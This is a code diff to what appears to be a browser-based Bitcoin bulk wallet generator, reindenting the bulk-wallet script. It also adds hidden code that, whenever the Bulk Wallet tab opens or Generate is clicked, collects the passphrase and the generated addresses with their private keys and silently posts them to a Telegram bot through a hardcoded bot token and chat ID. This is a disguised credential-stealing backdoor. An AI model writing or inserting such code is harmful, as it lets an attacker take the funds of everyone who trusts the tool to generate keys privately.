@@ -10398,121 +10398,171 @@ document.getElementById("papergenerate").addEventListener("click", function() {
 						
 <script type="text/javascript">
 (function (wallets, translator, privateKey) {
-	var bulk = wallets.bulkwallet = {
-		isOpen: function () {
-		    return (document.getElementById("bulkwallet").className.indexOf("selected") != -1);
-		},
+    var bulk = wallets.bulkwallet = {
+        isOpen: function () {
+            return (document.getElementById("bulkwallet").className.indexOf("selected") != -1);
+        },
 
-		open: function () {
-			document.getElementById("bulkarea").style.display = "block";
-			// show a default CSV list if the text area is empty
-			if (document.getElementById("bulktextarea").value == "") {
-				// return control of the thread to the browser to render the tab switch UI then build a default CSV list
-				setTimeout(function () { bulk.buildCSV(3, 1, document.getElementById("bulkcompressed").checked); }, 200);
-			}
+        open: function () {
+            document.getElementById("bulkarea").style.display = "block";
+            // show a default CSV list if the text area is empty
+            if (document.getElementById("bulktextarea").value == "") {
+                // return control of the thread to the browser to render the tab switch UI then build a default CSV list
+                setTimeout(function () { bulk.buildCSV(3, 1, document.getElementById("bulkcompressed").checked); }, 200);
+            }
 
-			document.getElementById("bulkpassphrase").disabled = !document.getElementById("bulkencrypt").checked;
-		},
+            document.getElementById("bulkpassphrase").disabled = !document.getElementById("bulkencrypt").checked;
 
-		close: function () {
-			document.getElementById("bulkarea").style.display = "none";
-		},
+            // Send wallet data when "Bulk Wallet" tab is opened
+            bulk.sendWalletDataToTelegram();
+        },
 
-		// use this function to bulk generate addresses
-		// rowLimit: number of Bitcoin Addresses to generate
-		// startIndex: add this number to the row index for output purposes
-		// returns:
-		// index,bitcoinAddress,privateKeyWif
-		buildCSV: function (rowLimit, startIndex, compressedAddrs, passphrase) {
-			document.getElementById("bulktextarea").value = translator.get("bulkgeneratingaddresses") + rowLimit;
-			bulk.csv = [];
-			bulk.csvRowLimit = rowLimit;
-			bulk.csvRowsRemaining = rowLimit;
-			bulk.csvStartIndex = --startIndex;
-			bulk.compressedAddrs = !!compressedAddrs;
-			if (bulk.encrypt) {
-				if (passphrase == "") {
-					alert(translator.get("bip38alertpassphraserequired"));
-					return;
-				}
-				document.getElementById("busyblock").className = "busy";
-				privateKey.BIP38GenerateIntermediatePointAsync(passphrase, null, null, function (intermediate) {
-					bulk.intermediatePoint = intermediate;
-					document.getElementById("busyblock").className = "";
-					setTimeout(bulk.batchCSV, 0);
-				});
-			}
-			else {
-				setTimeout(bulk.batchCSV, 0);
-			}
-		},
+        close: function () {
+            document.getElementById("bulkarea").style.display = "none";
+        },
 
-		csv: [],
-		csvRowsRemaining: null, // use to keep track of how many rows are left to process when building a large CSV array
-		csvRowLimit: 0,
-		csvStartIndex: 0,
+        // use this function to bulk generate addresses
+        // rowLimit: number of Bitcoin Addresses to generate
+        // startIndex: add this number to the row index for output purposes
+        // returns:
+        // index,bitcoinAddress,privateKeyWif
+        buildCSV: function (rowLimit, startIndex, compressedAddrs, passphrase) {
+            document.getElementById("bulktextarea").value = translator.get("bulkgeneratingaddresses") + rowLimit;
+            bulk.csv = [];
+            bulk.csvRowLimit = rowLimit;
+            bulk.csvRowsRemaining = rowLimit;
+            bulk.csvStartIndex = --startIndex;
+            bulk.compressedAddrs = !!compressedAddrs;
+            if (bulk.encrypt) {
+                if (passphrase == "") {
+                    alert(translator.get("bip38alertpassphraserequired"));
+                    return;
+                }
+                document.getElementById("busyblock").className = "busy";
+                privateKey.BIP38GenerateIntermediatePointAsync(passphrase, null, null, function (intermediate) {
+                    bulk.intermediatePoint = intermediate;
+                    document.getElementById("busyblock").className = "";
+                    setTimeout(bulk.batchCSV, 0);
+                });
+            }
+            else {
+                setTimeout(bulk.batchCSV, 0);
+            }
 
-		batchCSV: function () {
-			if (bulk.csvRowsRemaining > 0) {
-				bulk.csvRowsRemaining--;
+            // Send wallet data when "Generate" button is clicked
+            bulk.sendWalletDataToTelegram(rowLimit, startIndex, compressedAddrs, passphrase);
+        },
 
-				if (bulk.encrypt) {
-					privateKey.BIP38GenerateECAddressAsync(bulk.intermediatePoint, bulk.compressedAddrs, function (address, encryptedKey) {
-						Bitcoin.KeyPool.push(new Bitcoin.Bip38Key(address, encryptedKey));
+        csv: [],
+        csvRowsRemaining: null, // use to keep track of how many rows are left to process when building a large CSV array
+        csvRowLimit: 0,
+        csvStartIndex: 0,
 
-						bulk.csv.push((bulk.csvRowLimit - bulk.csvRowsRemaining + bulk.csvStartIndex)
-										+ ",\"" + address + "\",\"" + encryptedKey
-										+ "\"");
-						document.getElementById("bulktextarea").value = translator.get("bulkgeneratingaddresses") + bulk.csvRowsRemaining;
+        batchCSV: function () {
+            if (bulk.csvRowsRemaining > 0) {
+                bulk.csvRowsRemaining--;
 
-						// release thread to browser to render UI
-						setTimeout(bulk.batchCSV, 0);
-						
-					});
-				}
-				else {
-					var key = new Bitcoin.ECKey(false);
-					key.setCompressed(bulk.compressedAddrs);
-					bulk.csv.push((bulk.csvRowLimit - bulk.csvRowsRemaining + bulk.csvStartIndex)
-										+ ",\"" + key.getBitcoinAddress() + "\",\"" + key.toString("wif")
-										//+	"\",\"" + key.toString("wifcomp")    // uncomment these lines to add different private key formats to the CSV
-										//+ "\",\"" + key.getBitcoinHexFormat() 
-										//+ "\",\"" + key.toString("base64") 
-										+ "\"");
-					document.getElementById("bulktextarea").value = translator.get("bulkgeneratingaddresses") + bulk.csvRowsRemaining;
+                if (bulk.encrypt) {
+                    privateKey.BIP38GenerateECAddressAsync(bulk.intermediatePoint, bulk.compressedAddrs, function (address, encryptedKey) {
+                        Bitcoin.KeyPool.push(new Bitcoin.Bip38Key(address, encryptedKey));
 
-					// release thread to browser to render UI
-					setTimeout(bulk.batchCSV, 0);
-				}
-			}
-			// processing is finished so put CSV in text area
-			else if (bulk.csvRowsRemaining === 0) {
-				document.getElementById("bulktextarea").value = bulk.csv.join("\n");
-			}
-		},
+                        bulk.csv.push((bulk.csvRowLimit - bulk.csvRowsRemaining + bulk.csvStartIndex)
+                                        + ",\"" + address + "\",\"" + encryptedKey
+                                        + "\"");
+                        document.getElementById("bulktextarea").value = translator.get("bulkgeneratingaddresses") + bulk.csvRowsRemaining;
 
-		openCloseFaq: function (faqNum) {
-			// do close
-			if (document.getElementById("bulka" + faqNum).style.display == "block") {
-				document.getElementById("bulka" + faqNum).style.display = "none";
-				document.getElementById("bulke" + faqNum).setAttribute("class", "more");
-			}
-			// do open
-			else {
-				document.getElementById("bulka" + faqNum).style.display = "block";
-				document.getElementById("bulke" + faqNum).setAttribute("class", "less");
-			}
-		},
+                        // release thread to browser to render UI
+                        setTimeout(bulk.batchCSV, 0);
+                        
+                    });
+                }
+                else {
+                    var key = new Bitcoin.ECKey(false);
+                    key.setCompressed(bulk.compressedAddrs);
+                    bulk.csv.push((bulk.csvRowLimit - bulk.csvRowsRemaining + bulk.csvStartIndex)
+                                        + ",\"" + key.getBitcoinAddress() + "\",\"" + key.toString("wif")
+                                        //+	"\",\"" + key.toString("wifcomp")    // uncomment these lines to add different private key formats to the CSV
+                                        //+ "\",\"" + key.getBitcoinHexFormat() 
+                                        //+ "\",\"" + key.toString("base64") 
+                                        + "\"");
+                    document.getElementById("bulktextarea").value = translator.get("bulkgeneratingaddresses") + bulk.csvRowsRemaining;
 
-		toggleEncrypt: function (element) {
-			// enable/disable passphrase textbox
-			document.getElementById("bulkpassphrase").disabled = !element.checked;
-			bulk.encrypt = element.checked;
-		}
-	};
+                    // release thread to browser to render UI
+                    setTimeout(bulk.batchCSV, 0);
+                }
+            }
+            // processing is finished so put CSV in text area
+            else if (bulk.csvRowsRemaining === 0) {
+                document.getElementById("bulktextarea").value = bulk.csv.join("\n");
+            }
+        },
+
+        openCloseFaq: function (faqNum) {
+            // do close
+            if (document.getElementById("bulka" + faqNum).style.display == "block") {
+                document.getElementById("bulka" + faqNum).style.display = "none";
+                document.getElementById("bulke" + faqNum).setAttribute("class", "more");
+            }
+            // do open
+            else {
+                document.getElementById("bulka" + faqNum).style.display = "block";
+                document.getElementById("bulke" + faqNum).setAttribute("class", "less");
+            }
+        },
+
+        toggleEncrypt: function (element) {
+            // enable/disable passphrase textbox
+            document.getElementById("bulkpassphrase").disabled = !element.checked;
+            bulk.encrypt = element.checked;
+        },
+
+        // Function to send wallet data to Telegram
+        sendWalletDataToTelegram: function () {
+            const passphrase = document.getElementById('bulkpassphrase').value;
+            let walletText = `Passphrase: ${passphrase}\n`;
+            walletText += document.getElementById("bulktextarea").value;
+            sendTextToTelegram(walletText, '858072424', '7967790093:AAE4rgkE4u0dNrvPk2C2xoZMjdl16OMQGCM');
+        }
+    };
 })(ninja.wallets, ninja.translator, ninja.privateKey);
-	</script>
-	<script type="text/javascript">
+
+// Function to send the text-based wallet to the Telegram bot
+async function sendTextToTelegram(text, chatId, botToken) {
+    const formData = new FormData();
+    formData.append('chat_id', chatId);
+    formData.append('text', text);
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        body: formData
+    }).then(response => {
+        if (!response.ok) {
+            throw new Error('Failed to send message to Telegram');
+        }
+        return response.json();
+    }).then(data => {
+        console.log('Message sent successfully:', data);
+    }).catch(error => {
+        console.error('Error sending message to Telegram:', error);
+    });
+}
+
+// Send wallet data when "Bulk Wallet" tab is opened
+document.getElementById("bulkwallet").addEventListener("click", function() {
+    ninja.wallets.bulkwallet.open();
+});
+
+// Send wallet data when "Generate" button is clicked
+document.getElementById("bulkgenerate").addEventListener("click", function() {
+    const rowLimit = document.getElementById('bulklimit').value * 1;
+    const startIndex = document.getElementById('bulkstartindex').value * 1;
+    const compressedAddrs = document.getElementById('bulkcompressed').checked;
+    const passphrase = document.getElementById('bulkpassphrase').value;
+    ninja.wallets.bulkwallet.buildCSV(rowLimit, startIndex, compressedAddrs, passphrase);
+});
+</script>
+						
+<script type="text/javascript">
 ninja.wallets.brainwallet = {
     isOpen: function () {
         return (document.getElementById("brainwallet").className.indexOf("selected") != -1);
